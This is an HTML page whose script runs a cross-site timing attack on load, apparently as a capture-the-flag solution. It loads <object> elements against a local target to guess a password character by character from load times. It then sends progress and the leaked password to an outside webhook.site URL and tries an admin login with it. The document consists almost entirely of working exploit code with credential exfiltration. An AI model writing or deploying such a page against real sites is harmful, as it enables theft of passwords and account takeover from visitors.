<!DOCTYPE html>
<html>
<head><title>Object Timing Attack</title></head>
<body>
<h1>Object-based timing attack...</h1>
<pre id="output"></pre>
<script>
const output = document.getElementById('output');
const TARGET = 'https://127.0.0.1:9999/';
const CHARSET = '0123456789abcdef';
let knownPassword = 'lebah';

function log(msg) {
    output.textContent += msg + '\n';
    console.log(msg);
}

// Object-based timing measurement (more reliable than iframe)
function leak(pass) {
    return new Promise(resolve => {
        const start = performance.now();
        const object = document.createElement('object');
        object.width = '2000px';  // Important for timing difference!
        object.height = '2000px';
        object.data = TARGET + '?pass=' + encodeURIComponent(pass);
        
        object.onload = () => {
            object.remove();
            const end = performance.now();
            resolve(end - start);
        };
        
        object.onerror = () => {
            object.remove();
            const end = performance.now();
            resolve(end - start);
        };
        
        // Timeout fallback
        setTimeout(() => {
            if (object.parentNode) {
                object.remove();
                const end = performance.now();
                resolve(end - start);
            }
        }, 2000);
        
        document.body.appendChild(object);
    });
}

async function leakPassword() {
    log('[*] Object-based timing attack (justCTF technique)');
    log('[*] Known prefix: ' + knownPassword);
    
    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?status=object_attack_started').catch(e=>{});
    
    // Calibrate timing threshold
    log('\n[*] Calibrating timing threshold...');
    
    let foundTime = 0;
    let notFoundTime = 0;
    
    // Test known good (should be slow - has iframe)
    for (let i = 0; i < 3; i++) {
        foundTime += await leak('lebah');
    }
    foundTime /= 3;
    
    // Test known bad (should be fast - no iframe)
    for (let i = 0; i < 3; i++) {
        notFoundTime += await leak('lebahZ');
    }
    notFoundTime /= 3;
    
    const threshold = foundTime - ((foundTime - notFoundTime) / 2);
    
    log(`  Found (match): ${foundTime.toFixed(0)}ms`);
    log(`  Not found: ${notFoundTime.toFixed(0)}ms`);
    log(`  Threshold: ${threshold.toFixed(0)}ms`);
    
    if (notFoundTime >= foundTime) {
        log('\n❌ Timing calibration failed! No clear difference detected.');
        fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?error=timing_calibration_failed').catch(e=>{});
        return;
    }
    
    log('\n✅ Timing calibration successful!\n');
    
    // Leak characters (reduced to 4 for speed)
    for (let pos = 0; pos < 4; pos++) { // Only 4 chars to fit in 30s
        log(`[*] Position ${pos+1}/4...`);
        let found = false;
        
        for (let c of CHARSET) {
            const candidate = knownPassword + c;
            
            // Single measurement for speed
            const avgTime = await leak(candidate);
            
            log(`  "${c}": ${avgTime.toFixed(0)}ms ${avgTime >= threshold ? '✓ MATCH!' : ''}`);
            
            if (avgTime >= threshold) {
                knownPassword = candidate;
                log(`  [+] Found '${c}' -> ${knownPassword}\n`);
                
                // Send progress
                fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?progress=' + encodeURIComponent(knownPassword)).catch(e=>{});
                
                found = true;
                break;
            }
        }
        
        if (!found) {
            log(`  [-] No match at position ${pos+1}!`);
            break;
        }
    }
    
    log('\n========================================');
    log('LEAKED PASSWORD: ' + knownPassword);
    log('========================================');
    
    // Final exfiltration
    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?password=' + encodeURIComponent(knownPassword)).catch(e=>{});
    
    // Test login
    log('\n[*] Testing login...');
    setTimeout(async () => {
        try {
            const response = await fetch(TARGET + 'login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `username=admin&password=${encodeURIComponent(knownPassword)}`,
                credentials: 'include'
            });
            
            const success = response.redirected || !response.url.includes('login');
            log(`Login result: ${success ? '✅ SUCCESS!' : '❌ Failed'}`);
            
            if (success) {
                fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?LOGIN_SUCCESS=' + encodeURIComponent(knownPassword)).catch(e=>{});
            }
        } catch (e) {
            log('Login test error: ' + e.message);
        }
    }, 1000);
}

setTimeout(leakPassword, 500);
</script>
</body>
</html>
